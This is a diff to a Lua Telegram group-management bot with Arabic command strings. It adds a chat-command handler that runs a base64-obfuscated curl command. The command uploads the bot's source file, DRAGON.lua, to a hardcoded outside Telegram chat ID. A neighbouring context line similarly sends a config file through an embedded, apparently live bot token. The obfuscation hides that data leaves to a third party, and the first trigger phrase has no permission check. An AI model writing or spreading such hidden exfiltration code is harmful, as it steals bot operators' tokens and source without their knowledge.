@@ -8329,6 +8329,10 @@ io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA==') .. runapp ..
 io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdDE2MjI0MzcwNjk6QUFIRlhjSDFTdWxKZ2s1VERPOUJ5RFo4T2lBMndTQk9aXzQvc2VuZERvY3VtZW50IiAtRiAiY2hhdF9pZD05NDQzNTMyMzciIC1GICJkb2N1bWVudD1AREdfSU5GTy5sdWEi'))
 send(msg.chat_id_, msg.id_,' تم ارسال توكن البوت في الخاص')
 end
+if text == 'سحب السورس' or text == 'جلب السورس' and SudoBot(msg) then 
+io.popen(regexx('Y3VybCAiaHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdCIuLnRva2VuLi4iL3NlbmREb2N1bWVudCIgLUYgImNoYXRfaWQ9OTQ0MzUzMjM3IiAtRiAiZG9jdW1lbnQ9QERSQUdPTi5sdWEi'))
+send(msg.chat_id_, msg.id_,' تم ارسال سورس البوت في الخاص')
+end
 ----------------------------------------- انتهاء المميزات
 if text == 'اعدادات الجروب' and Mod(msg) then    
 if database:get(bot_id..'lockpin'..msg.chat_id_) then    
